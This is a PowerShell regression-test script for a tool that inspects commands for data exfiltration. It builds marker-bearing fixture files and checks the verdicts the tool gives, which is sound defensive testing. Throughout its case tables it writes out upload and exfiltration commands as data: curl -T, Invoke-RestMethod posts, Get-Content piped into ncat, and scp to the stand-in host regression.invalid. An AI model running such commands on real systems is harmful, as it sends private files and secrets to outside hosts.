# Source strings are scanned without executing listeners, uploaders or network calls.
$textMarker='fixture-sensitive-xyz'
$utf8=[Text.UTF8Encoding]::new($false)
function Write-FixtureFile($name,$body,$encoding=$utf8) {
    [IO.File]::WriteAllText((Join-Path $files $name),$body,$encoding)
}
$large=' '.PadRight(131072+32764)
Write-FixtureFile 'stream-boundary.txt' ($large + $textMarker)
Write-FixtureFile 'stream-clean.txt' ($large + 'ordinary')
Write-FixtureFile 'stream-capped.txt' (' '.PadRight(196608) + $textMarker)
Write-FixtureFile 'stream-prefix-hit.txt' ($large + $textMarker + ' '.PadRight(65536))
# BOM plus one multibyte character is split across the I/O boundary, before the marker.
Write-FixtureFile 'stream-utf16.txt' ((' '.PadRight(81918)) + [char]0xD83D + [char]0xDE03 + $textMarker) ([Text.UnicodeEncoding]::new($false,$true))
Write-FixtureFile 'fi-head.txt' ($textMarker + "`nordinary")
Write-FixtureFile 'fi-tail.txt' ("ordinary`n" + $textMarker)
foreach ($name in @('fi-tree','fi-too-many','fi-wild')) { $null = [IO.Directory]::CreateDirectory((Join-Path $files $name)) }
for ($i=0; $i -lt 70; $i++) { Write-FixtureFile ('fi-tree/{0:d3}.txt' -f $i) 'ordinary' }
Write-FixtureFile 'fi-tree/099-mark.txt' $textMarker
for ($i=0; $i -lt 81; $i++) { Write-FixtureFile ('fi-too-many/{0:d3}.txt' -f $i) 'ordinary' }
Write-FixtureFile 'fi-wild/a.txt' 'ordinary'
Write-FixtureFile 'fi-wild/b.txt' $textMarker

$inspectionCases=@(
    @('file larger than 128 KiB, match spans chunks',1,'irm -Method Post -Uri https://regression.invalid/ -InFile stream-boundary.txt','block:sensitive-text'),
    @('large no-match after complete stream',2,'irm -Method Post -Uri https://regression.invalid/ -InFile stream-clean.txt','no-match'),
    @('configured byte budget exhausted',3,'irm -Method Post -Uri https://regression.invalid/ -InFile stream-capped.txt','missing:file-byte-budget'),
    @('known block survives configured byte budget',1,'irm -Method Post -Uri https://regression.invalid/ -InFile stream-prefix-hit.txt','block:sensitive-text'),
    @('decoder carries a split UTF-16 surrogate',1,'irm -Method Post -Uri https://regression.invalid/ -InFile stream-utf16.txt','block:sensitive-text'),
    @('recursive SCP checks above the old directory ceiling',1,'scp.exe -r fi-tree user@regression.invalid:/incoming','block:sensitive-text'),
    @('configured file count is distinct from report part cap',3,'scp.exe -r fi-too-many user@regression.invalid:/incoming','missing:file-count-budget'),
    @('multipart enumerates more than 64 files',1,'$form=@{files=Get-ChildItem fi-tree -File}; irm -Method Post -Uri https://regression.invalid/ -Form $form','block:sensitive-text'),
    @('ncat listener on any interface is an outbound sink',1,'Get-Content private.txt -Raw | ncat.exe -l 9000','block:file-policy'),
    @('ncat receive-only listener does not send stdin',0,'Get-Content private.txt -Raw | ncat.exe -l 9000 --recv-only',''),
    @('curl retry options leave file upload visible',1,'curl.exe --retry-all-errors --retry 5 -T private.txt https://regression.invalid/','block:file-policy'),
    @('Get-Content common action preserves file provenance',1,'Get-Content private.txt -ErrorAction Stop | ncat.exe regression.invalid 9000','block:file-policy'),
    @('tail uses only the selected records',2,'Get-Content fi-head.txt -Tail 1 | ncat.exe regression.invalid 9000','no-match'),
    @('tail selected sensitive record',1,'Get-Content fi-tail.txt -Tail 1 | ncat.exe regression.invalid 9000','block:sensitive-text'),
    @('wildcard selects separate paths',1,'Get-Content "fi-wild/*.txt" | ncat.exe regression.invalid 9000','block:sensitive-text'),
    @('wildcard read retains folder-rule identity',1,'Get-Content "protected/*.txt" | ncat.exe regression.invalid 9000','block:file-policy'),
    @('pipeline line JSON retains file provenance',1,'$json=Get-Content private.txt | ConvertTo-Json -Compress; irm -Uri https://regression.invalid/ -Body $json','block:file-policy'),
    @('pipeline line list JSON retains file provenance',1,'$json=Get-Content fi-tail.txt | ConvertTo-Json -Compress; irm -Uri https://regression.invalid/ -Body $json','block:sensitive-text'),
    @('plain delay does not invalidate the recorded source',1,'$s=Get-Content private.txt -Raw; Start-Sleep 1; irm -Uri https://regression.invalid/ -Body $s','block:file-policy'),
    @('dynamic native command can use a known string',1,'$cmd="curl.exe"; & $cmd -T private.txt https://regression.invalid/','block:file-policy'),
    @('native array splat preserves option and argument boundaries',1,'$curlArgs=@("--retry-all-errors","-T","private.txt","https://regression.invalid/"); curl.exe @curlArgs','block:file-policy'),
    @('dynamic command plus splat preserves file provenance',1,'$cmd="curl.exe"; $options=@("-T","private.txt","https://regression.invalid/"); & $cmd @options','block:file-policy'),
    @('Test-Path true preserves prior state',1,'$s=Get-Content private.txt -Raw; if (Test-Path -LiteralPath private.txt -PathType Leaf) { irm -Uri https://regression.invalid/ -Body $s }','block:file-policy'),
    @('Test-Path false skips an unreachable send',0,'if (Test-Path -LiteralPath missing-testpath-fixture.txt) { irm -Uri https://regression.invalid/ -Body "fixture-sensitive-xyz" }',''),
    @('configured external path is checked lexically without opening its share',1,'irm -Uri https://regression.invalid/ -InFile "\\nonexistent-guard-fixture.invalid\share\restricted.txt"','block:file-policy'),
    @('PSCustomObject JSON retains source',1,'$s=Get-Content private.txt -Raw; $j=[pscustomobject]@{token=$s} | ConvertTo-Json -Compress; irm -Uri https://regression.invalid/ -Body $j','block:file-policy')
)
foreach ($row in $inspectionCases) {
    $event=Scan $row[2]
    Is $row[1] $event $row[0]
    if ($row[3] -ne '' -and $event.report.policy.decision -ne $row[3]) {
        throw "$($row[0]): expected $($row[3]), got $($event.report.policy.decision)"
    }
}
"PASS: $($inspectionCases.Count) file-budget, chunked scan, directory and adapter regressions."

# Follow-up fixtures: inspect selected bytes/records and provenance without executing a send.
$tailPrefix = ('x' * 220000) + "`r`n"
Write-FixtureFile 'fi-large-tail.txt' ($tailPrefix + "ordinary`r`n" + $textMarker + "`r`n")
Write-FixtureFile 'fi-large-tail-head-only.txt' ($textMarker + "`r`n" + $tailPrefix + "ordinary`r`n")
Write-FixtureFile 'fi-large-tail-utf16.txt' ($tailPrefix + "ordinary`r" + $textMarker + "`r") ([Text.UnicodeEncoding]::new($true,$true))
Write-FixtureFile 'fi-single-long-tail.txt' ($tailPrefix.TrimEnd() + $textMarker)
Write-FixtureFile 'fi-multiple-records.txt' "ordinary`none more record"
Write-FixtureFile 'fi-form-danger.txt' $textMarker
$null = [IO.Directory]::CreateDirectory((Join-Path $files 'fi-form-nested/child'))
Write-FixtureFile 'fi-form-nested/child/file.txt' $textMarker

$followupCases=@(
    @('nested JSON one-line field inherits file path',1,'$s=Get-Content private.txt; $json=@{token=$s} | ConvertTo-Json -Compress; irm -Uri https://regression.invalid -Body $json','block:file-policy'),
    @('nested JSON one-line field inherits only a file source, not text rules',1,'$s=Get-Content private.txt; $json=@{wrap=@{token=$s}} | ConvertTo-Json -Compress; irm -Uri https://regression.invalid -Body $json','block:file-policy'),
    @('nested JSON multiline field retains a selected text mark',1,'$s=Get-Content fi-tail.txt; $json=@{token=$s} | ConvertTo-Json -Compress; irm -Uri https://regression.invalid -Body $json','block:sensitive-text'),
    @('nested line array cut by output depth is not marked as transmitted',3,'$s=Get-Content fi-tail.txt; $json=@{token=$s} | ConvertTo-Json -Depth 0 -Compress; irm -Uri https://regression.invalid -Body $json','missing:json-output-partial'),
    @('nested ordinary line array serializes without a partial warning',2,'$s=Get-Content fi-multiple-records.txt; $json=@{token=$s} | ConvertTo-Json -Compress; irm -Uri https://regression.invalid -Body $json','no-match'),
    @('Get-ChildItem without File yields regular FileInfo objects',1,'$f=@{files=Get-ChildItem fi-tree}; irm -Uri https://regression.invalid -Form $f','block:sensitive-text'),
    @('Get-ChildItem without Recurse does not upload directory children',3,'$f=@{files=Get-ChildItem fi-form-nested}; irm -Uri https://regression.invalid -Form $f','missing:multipart-directory-metadata'),
    @('Get-ChildItem -Recurse still inspects returned files',1,'$f=@{files=Get-ChildItem fi-form-nested -Recurse}; irm -Uri https://regression.invalid -Form $f','block:sensitive-text'),
    @('Get-Item accepts a read-only common parameter',1,'$f=@{file=Get-Item private.txt -ErrorAction Stop}; irm -Uri https://regression.invalid -Form $f','block:file-policy'),
    @('Get-ChildItem accepts common parameter alias and inline switch',1,'$f=@{files=Get-ChildItem fi-tree -File -EA Stop -Verbose:$false}; irm -Uri https://regression.invalid -Form $f','block:sensitive-text'),
    @('curl rate option does not discard file source',1,'curl.exe --limit-rate 100k -T private.txt https://regression.invalid/','block:file-policy'),
    @('curl arity-only switch and value preserve later sources',1,'curl.exe --parallel --max-filesize 100k -T private.txt https://regression.invalid/','block:file-policy'),
    @('curl still reports uncertainty for unmodeled options after parsing',3,'curl.exe --cacert "-T" https://regression.invalid/','missing:unmodeled-option'),
    @('tail finds marker despite a larger-than-budget prefix',1,'Get-Content fi-large-tail.txt -Tail 2 | ncat.exe regression.invalid 9000','block:sensitive-text'),
    @('tail does not inspect non-transmitted head marker',2,'Get-Content fi-large-tail-head-only.txt -Tail 1 | ncat.exe regression.invalid 9000','no-match'),
    @('tail detects UTF-16 big-endian and standalone CR records',1,'Get-Content fi-large-tail-utf16.txt -Tail 1 | ncat.exe regression.invalid 9000','block:sensitive-text'),
    @('tail retains a known match in a capped last record',1,'Get-Content fi-single-long-tail.txt -Tail 1 | ncat.exe regression.invalid 9000','block:sensitive-text'),
    @('Get-Content literal path array tracks the second file',1,'Get-Content -LiteralPath "fi-head.txt","private.txt" -Tail 1 | ncat.exe regression.invalid 9000','block:file-policy'),
    @('Get-Content mixed wildcard and literal inputs retain matches',1,'Get-Content -Path "does-not-exist.txt","fi-wild/*.txt" | ncat.exe regression.invalid 9000','block:sensitive-text')
)
foreach ($row in $followupCases) {
    $event=Scan $row[2]
    Is $row[1] $event $row[0]
    if ($event.report.policy.decision -ne $row[3]) {
        throw "$($row[0]): expected $($row[3]), got $($event.report.policy.decision)"
    }
}
"PASS: $($followupCases.Count) nested JSON, Form, curl arity, tail and multiple-path regressions."

# Prefix-only evidence, multipart selection and preservation through a partial JSON scalar.
$null = [IO.Directory]::CreateDirectory((Join-Path $files 'fi-filter'))
Write-FixtureFile 'fi-filter/a.csv' 'ordinary'
Write-FixtureFile 'fi-filter/selected.csv' $textMarker
Write-FixtureFile 'fi-filter/skip.txt' $textMarker
Write-FixtureFile 'fi-head-then-large.txt' ($textMarker + "`r`n" + ('x' * 220000))
Write-FixtureFile 'fi-head-with-later-hit.txt' ("ordinary`r`n" + ('x' * 220000) + $textMarker)
Write-FixtureFile 'fi-head-utf32.txt' ("ordinary`r" + $textMarker + "`r" + ('x' * 220000)) ([Text.UTF32Encoding]::new($true,$true))
Write-FixtureFile 'fi-head-crossing.txt' (('x' * 32763) + "`r`n" + $textMarker + "`n" + ('x' * 220000))
Write-FixtureFile 'fi-head-capped.txt' ($textMarker + ('x' * 220000))
Write-FixtureFile 'fi-head-binary-after.txt' ("ordinary`r`n" + ('x' * 220000))
$invalidHeadPath = Join-Path $files 'fi-head-binary-after.txt'
$invalidHeadBytes=[IO.File]::ReadAllBytes($invalidHeadPath)
$invalidHeadBytes[10]=255
[IO.File]::WriteAllBytes($invalidHeadPath,$invalidHeadBytes)

$sourceProofCases=@(
    @('large TotalCount first record match',1,'Get-Content fi-head-then-large.txt -TotalCount 1 | ncat.exe regression.invalid 9000','block:sensitive-text'),
    @('large TotalCount excludes later sensitive bytes',2,'Get-Content fi-head-with-later-hit.txt -TotalCount 1 | ncat.exe regression.invalid 9000','no-match'),
    @('large TotalCount UTF32 BOM and CR records',1,'Get-Content fi-head-utf32.txt -TotalCount 2 | ncat.exe regression.invalid 9000','block:sensitive-text'),
    @('large TotalCount crosses stream buffer boundary',1,'Get-Content fi-head-crossing.txt -TotalCount 2 | ncat.exe regression.invalid 9000','block:sensitive-text'),
    @('large TotalCount retains prefix hit when first line exceeds budget',1,'Get-Content fi-head-capped.txt -TotalCount 1 | ncat.exe regression.invalid 9000','block:sensitive-text'),
    @('large TotalCount does not decode invalid bytes beyond selected line',2,'Get-Content fi-head-binary-after.txt -TotalCount 1 | ncat.exe regression.invalid 9000','no-match'),
    @('large TotalCount reports partial when budget cuts a line with no match',3,'Get-Content fi-head-with-later-hit.txt -TotalCount 2 | ncat.exe regression.invalid 9000','missing:file-head-byte-budget'),
    @('large TotalCount accepts Int64 line count',1,'Get-Content fi-head-then-large.txt -TotalCount 2147483648 | ncat.exe regression.invalid 9000','block:sensitive-text'),
    @('multipart provider Filter selects matching files',1,'$f=@{files=Get-ChildItem fi-filter -File -Filter "*.csv"}; irm -Uri https://regression.invalid -Form $f','block:sensitive-text'),
    @('multipart provider Filter excludes nonmatching files',2,'$f=@{files=Get-ChildItem fi-filter -File -Filter "a.csv"}; irm -Uri https://regression.invalid -Form $f','no-match'),
    @('multipart Include and Exclude are applied to explicit directory contents',2,'$f=@{files=Get-ChildItem "fi-filter/*" -File -Include "*.csv","*.txt" -Exclude "selected*","skip*"}; irm -Uri https://regression.invalid -Form $f','no-match'),
    @('multipart Include and Exclude select a source with LiteralPath',1,'$f=@{files=Get-ChildItem -LiteralPath fi-filter -File -Include "*.csv" -Exclude "a.csv"}; irm -Uri https://regression.invalid -Form $f','block:sensitive-text'),
    @('raw large JSON field retains text stream rule hit',1,'$s=Get-Content stream-boundary.txt -Raw; $j=@{content=$s}|ConvertTo-Json -Compress; irm -Uri https://regression.invalid -Body $j','block:sensitive-text'),
    @('raw large JSON field preserves hit even when bytes incomplete',1,'$s=Get-Content stream-prefix-hit.txt -Raw; $j=@{wrap=@{content=$s}}|ConvertTo-Json -Compress -ErrorAction Stop; irm -Uri https://regression.invalid -Body $j','block:sensitive-text'),
    @('large incomplete JSON scalar does not propagate from a discarded container',3,'$s=Get-Content stream-prefix-hit.txt -Raw; $j=@{wrap=@{content=$s}}|ConvertTo-Json -Depth 0 -Compress; irm -Uri https://regression.invalid -Body $j','missing:json-output-partial')
)
foreach ($row in $sourceProofCases) {
    $event=Scan $row[2]
    Is $row[1] $event $row[0]
    if ($event.report.policy.decision -ne $row[3]) {
        throw "$($row[0]): expected $($row[3]), got $($event.report.policy.decision)"
    }
}
"PASS: $($sourceProofCases.Count) TotalCount, multipart file filters and partial JSON provenance regressions."

# Exclude-alone candidates and large Get-Content line provenance.
$null=[IO.Directory]::CreateDirectory((Join-Path $files 'fi-exclude'))
$null=[IO.Directory]::CreateDirectory((Join-Path $files 'fi-exclude-only-tmp'))
Write-FixtureFile 'fi-exclude/selected.csv' $textMarker
Write-FixtureFile 'fi-exclude/do-not-send.tmp' $textMarker
Write-FixtureFile 'fi-exclude-only-tmp/ordinary.csv' 'ordinary'
Write-FixtureFile 'fi-exclude-only-tmp/do-not-send.tmp' $textMarker
Write-FixtureFile 'fi-large-two-lines.txt' ("ordinary`r`n" + 'x'.PadRight(163837,'x') + $textMarker)
$blobFollowups=@(
    @('plain Exclude does not erase multipart candidates',1,'$f=@{files=Get-ChildItem fi-exclude -File -Exclude "*.tmp"}; irm -Uri https://regression.invalid -Form $f','block:sensitive-text'),
    @('plain Exclude never inspects excluded temp data',2,'$f=@{files=Get-ChildItem fi-exclude-only-tmp -File -Exclude "*.tmp"}; irm -Uri https://regression.invalid -Form $f','no-match'),
    @('large line array in a JSON field carries text provenance',1,'$lines=Get-Content fi-large-two-lines.txt; $j=@{lines=$lines}|ConvertTo-Json -Compress; irm -Uri https://regression.invalid -Body $j','block:sensitive-text'),
    @('large capped lines in a JSON field still carry confirmed source',1,'$lines=Get-Content stream-prefix-hit.txt; $j=@{nested=@{lines=$lines}}|ConvertTo-Json -Compress; irm -Uri https://regression.invalid -Body $j','block:sensitive-text'),
    @('JSON depth rules do not count an unmaterialized array as emitted',3,'$lines=Get-Content fi-large-two-lines.txt; $j=@{lines=$lines}|ConvertTo-Json -Depth 0 -Compress; irm -Uri https://regression.invalid -Body $j','missing:json-output-partial'),
    @('large ordinary line content unknown formatting is not a match',3,'$lines=Get-Content stream-clean.txt; $j=@{lines=$lines}|ConvertTo-Json -Compress; irm -Uri https://regression.invalid -Body $j','missing:json-output-partial')
)
foreach ($row in $blobFollowups) {
    $event=Scan $row[2]
    Is $row[1] $event $row[0]
    if ($event.report.policy.decision -ne $row[3]) {
        throw "$($row[0]): expected $($row[3]), got $($event.report.policy.decision)"
    }
}
"PASS: $($blobFollowups.Count) multipart Exclude and unmaterialized JSON line-record regressions."
